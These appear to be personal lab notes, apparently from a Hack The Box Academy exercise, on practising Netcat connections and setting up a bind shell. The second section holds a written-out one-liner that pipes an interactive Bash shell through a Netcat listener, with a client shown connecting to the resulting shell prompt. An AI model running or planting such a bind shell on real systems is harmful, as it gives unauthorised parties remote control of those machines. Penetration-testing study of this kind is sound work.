![[Pasted image 20260502132303.png]]
## Practicing with GNU Netcat
#### No. 1: Server - Target starting Netcat listener

```Shell
Target@server:~$ nc -lvnp 7777 

Listening on [0.0.0.0] (family 0, port 7777)
```
#### No. 2: Client - Attack box connecting to target

```shell
3kjS@htb[/htb]$ nc -nv 10.129.41.200 7777 

Connection to 10.129.41.200 7777 port [tcp/*] succeeded!
```
#### No. 3: Server - Target receiving connection from client

```shell
Target@server:~$ nc -lvnp 7777 

Listening on [0.0.0.0] (family 0, port 7777) 
Connection from 10.10.14.117 51872 received!
```
#### No. 4: Client - Attack box sending message Hello Academy

```Shell
3kjS@htb[/htb]$ nc -nv 10.129.41.200 7777 

Connection to 10.129.41.200 7777 port [tcp/*] succeeded! 
Hello Academy
```
#### No. 5: Server - Target receiving Hello Academy message

```shell
Victim@server:~$ nc -lvnp 7777 

Listening on [0.0.0.0] (family 0, port 7777) 
Connection from 10.10.14.117 51914 received! 
Hello Academy
```

## Establishing a Basic Bind Shell with Netcat
#### No. 1: Server - Binding a Bash shell to the TCP session

```Shell
Target@server:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
```
#### No. 2: Client - Connecting to bind shell on target

```shell
3kjS@htb[/htb]$ nc -nv 10.129.41.200 7777 

Target@server:~$
```

